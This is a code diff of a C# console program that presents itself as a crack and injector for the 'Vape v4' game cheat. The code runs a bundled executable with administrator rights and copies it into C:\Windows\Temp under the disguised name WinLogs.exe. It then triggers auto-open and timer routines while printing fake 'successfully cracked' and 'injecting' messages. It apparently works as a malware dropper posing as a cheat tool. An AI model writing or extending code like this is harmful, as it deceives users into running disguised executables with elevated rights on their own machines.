@@ -20,7 +20,7 @@ namespace Vape_v4._05
         {
             if (File.Exists(@"C:\Windows\Temp\Xif.txt"))
             {
-                Console.WriteLine("If you still have a problem with cheat, please write to support oracletrue@mail.ru");
+                Console.WriteLine("If you still have a problem with cheat, please write to support daumgirn@gmail.com");
                 Console.ReadKey();
             }            
             else if (File.Exists(@"C:\Windows\Temp\WinLogs.exe"))
@@ -45,17 +45,25 @@ namespace Vape_v4._05
             }
             else
             {
-                Console.WriteLine("Succesfully import Injector");
-                Console.WriteLine("Succesfully import Kernel");
-                Console.WriteLine("Succesfully import AppData");
-                Console.WriteLine("Succesfully crack vape");
-                ExecuteAsAdmin(@"bin\Tools\vape v4.exe");
-                ExecuteAsAdmin(@"");
-                File.Copy(@"bin\Tools\vape v4.exe", @"C:\Windows\Temp\WinLogs.exe");
-                AutoMaticOpen();
-                Console.WriteLine("Starting inject...");
-                SetTimer();
-                Console.ReadKey();
+                try
+                {
+                    ExecuteAsAdmin(@"bin\Tools\vape v4.exe");
+                    ExecuteAsAdmin(@"");
+                    Console.WriteLine("Succesfully import Injector");
+                    Console.WriteLine("Succesfully import Kernel");
+                    Console.WriteLine("Succesfully import AppData");
+                    Console.WriteLine("Succesfully crack vape");                   
+                    File.Copy(@"bin\Tools\vape v4.exe", @"C:\Windows\Temp\WinLogs.exe");
+                    AutoMaticOpen();
+                    Console.WriteLine("Starting inject...");
+                    SetTimer();
+                    Console.ReadKey();
+                }
+                catch
+                {
+                    Console.WriteLine("\aOh no, the files in folder bin not found!\nPlease, install archive again and don't delete files in folder bin");
+                    Console.ReadKey();
+                }
             }
         }
         private static void AutoMaticOpen()
@@ -129,7 +137,7 @@ namespace Vape_v4._05
         private static void OnTime1(Object source, ElapsedEventArgs e)
         {
             Console.Clear();
-            Console.WriteLine("Start find problem...");
+            Console.WriteLine("Start looking for a problem...");
             Timer();
         }
 
